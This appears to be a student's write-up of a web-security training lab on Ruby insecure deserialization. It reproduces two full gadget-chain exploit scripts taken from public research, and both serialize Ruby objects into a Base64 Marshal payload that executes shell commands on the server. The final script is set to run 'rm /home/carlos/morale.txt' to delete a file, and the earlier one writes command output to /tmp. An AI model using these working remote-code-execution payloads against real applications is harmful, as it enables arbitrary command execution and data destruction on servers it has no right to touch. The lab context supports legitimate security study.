# [Insecure deserialization] Lab: Exploiting Ruby deserialization using a documented gadget chain (1)

---

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20Ruby%20des%206f08889bec9543ae81eb240e32f07bc5/Untitled.png)

trying to get frame work by causing server error: 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20Ruby%20des%206f08889bec9543ae81eb240e32f07bc5/Untitled%201.png)

lets just see if there are any generic deserialization exploits for ruby 

i came across this site: [https://bishopfox.com/blog/ruby-vulnerabilities-exploits](https://bishopfox.com/blog/ruby-vulnerabilities-exploits)

that included this script: 

```jsx
# original code by Harsh Jaiswal, AKA rootxharsh and Rahul Maini, AKA iamnoooob
# Mostly based on:
# https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md

require 'rails/all'
require 'base64'
# following three lines added for older versions of Ruby on Rails:
require 'rack/response'
require 'active_record/associations'
require 'active_record/associations/association'

require "yaml"
Gem::SpecFetcher
Gem::Installer

require 'sprockets'
class Gem::Package::TarReader
end

require 'bundler/inline'

gemfile do
  source 'https://rubygems.org'
  gem 'oj', require: true
end

d = Rack::Response.allocate
d.instance_variable_set(:@buffered, false)

d0=Rails::Initializable::Initializer.allocate
d0.instance_variable_set(:@context,Sprockets::Context.allocate)

d1=Gem::Security::Policy.allocate
# Can't use angle brackets in the command below or it will result in a dump format error(0xc3) ArgumentException
# Similar problem for + signs in some Ruby versions
# So the code below dynamically builds the string 'date >> /tmp/rce9a.txt'
d1.instance_variable_set(:@name,{ :filename => "/tmp/xyz.txt", :environment => d0  , :data => "<%= os_command = 'date '; os_command.concat(62.chr); os_command.concat(62.chr); os_command.concat('/tmp/rce9a.txt'); system(os_command); %>", :metadata => {}})

d2=Set.new([d1])

d.instance_variable_set(:@body, d2)
d.instance_variable_set(:@writer, Sprockets::ERBProcessor.allocate)

c=Logger.allocate
c.instance_variable_set(:@logdev, d)

e=Gem::Package::TarReader::Entry.allocate
e.instance_variable_set(:@read,2)
e.instance_variable_set(:@header,"bbbb")

b=Net::BufferedIO.allocate
b.instance_variable_set(:@io,e)
b.instance_variable_set(:@debug_output,c)

$a=Gem::Package::TarReader.allocate
$a.instance_variable_set(:@init_pos,Gem::SpecFetcher.allocate)
$a.instance_variable_set(:@io,b)

module ActiveRecord
    module Associations
        class Association
            def marshal_dump
                # Gem::Installer instance is also set here
                # because it autoloads Gem::Package which is
                # required in rest of the chain
                [Gem::Installer.allocate, $a] 
            end
        end
    end
end

# binary form
final = ActiveRecord::Associations::Association.allocate
puts Base64.strict_encode64(Marshal.dump(final))
```

right now the script was executing the data command and passing it to a file. 

but we want it to remove a morale.txt file to be deleted. 

so lets change the command to `rm /home/carlos/morale.txt`

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20Ruby%20des%206f08889bec9543ae81eb240e32f07bc5/Untitled%202.png)

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20Ruby%20des%206f08889bec9543ae81eb240e32f07bc5/Untitled%203.png)

and other we go lab solved: 

![Untitled](%5BInsecure%20deserialization%5D%20Lab%20Exploiting%20Ruby%20des%206f08889bec9543ae81eb240e32f07bc5/dee18f11-ecf1-4b48-8edc-2712691d810a.png)

---

**FINAL CODE:** 

```jsx
# Original code by William Bowling, AKA vakzz
# Mostly based on https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

require "base64"

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump({payload: [Gem::SpecFetcher, Gem::Installer, r]})
puts Base64.strict_encode64(payload)
```